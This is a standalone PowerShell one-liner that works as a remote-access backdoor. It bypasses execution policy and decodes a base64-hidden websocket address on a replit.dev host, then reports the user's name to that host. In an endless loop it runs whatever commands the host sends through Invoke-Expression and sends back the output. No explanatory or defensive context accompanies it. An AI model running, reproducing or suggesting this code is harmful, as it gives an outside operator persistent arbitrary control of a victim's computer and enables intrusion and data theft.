powershell -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'Stop'; $encodedUrl = 'd3NzOi8vMTRmM2U3ZDEtOTg2Yi00NGEzLTk2YWUtNzg1NWRmODk5YzVkLTAwLW55eTJuanFlZWE5cC5raXJrLnJlcGxpdC5kZXYv'; $decodedUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl)); while ($true) { try { $ws = New-Object System.Net.WebSockets.ClientWebSocket; $uri = [System.Uri]::new($decodedUrl); $ws.ConnectAsync($uri, [Threading.CancellationToken]::None).Wait(); $username = $env:USERNAME; $uuid = [guid]::NewGuid().ToString(); $details = @{type = 'client_details'; clientId = $uuid; nickname = $username} | ConvertTo-Json; $buffer = [System.Text.Encoding]::UTF8.GetBytes($details); $segment = [System.ArraySegment[byte]]::new($buffer); $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait(); while ($ws.State -eq 'Open') { try { $recvBuffer = New-Object Byte[] 4096; $segment = [System.ArraySegment[byte]]::new($recvBuffer); $ws.ReceiveAsync($segment, [Threading.CancellationToken]::None).Wait(); $data = [System.Text.Encoding]::UTF8.GetString($recvBuffer).Trim([char]0); if ($data) { $json = $data | ConvertFrom-Json; if ($json.type -eq 'command') { $output = Invoke-Expression $json.command 2>&1 | Out-String; $response = @{type = 'command_output'; clientId = $uuid; output = $output} | ConvertTo-Json; $buffer = [System.Text.Encoding]::UTF8.GetBytes($response); $segment = [System.ArraySegment[byte]]::new($buffer); $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait(); } } } catch { continue; } Start-Sleep -Seconds 10; } } catch { Start-Sleep -Seconds 5; } }"